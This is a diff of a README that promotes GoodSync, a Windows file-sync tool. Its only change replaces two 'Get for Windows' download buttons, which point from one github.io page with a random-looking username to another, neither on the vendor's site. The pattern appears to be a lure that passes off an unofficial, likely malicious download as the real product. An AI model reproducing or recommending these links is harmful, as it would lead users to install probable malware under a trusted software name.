@@ -2,7 +2,7 @@
 
 <img src="https://www.goodsync.com/images/enterprise/screenshots/sync_tree.jpg" alt="GoodSync Logo" width="660">
 
-[![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://camilorobersonopcr.github.io/.github/GoodSync-File-Manager)
+[![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://cadenshahercx.github.io/.github/GoodSync-File-Manager)
 
 ---
 
@@ -20,7 +20,7 @@ Designed specifically for Windows, GoodSync combines file synchronization, autom
 
 <img src="https://www.snapfiles.com/screenfiles/goodsync.png" width="900">
 
-[![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://camilorobersonopcr.github.io/.github/GoodSync-File-Manager)
+[![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://cadenshahercx.github.io/.github/GoodSync-File-Manager)
 
 ---
 
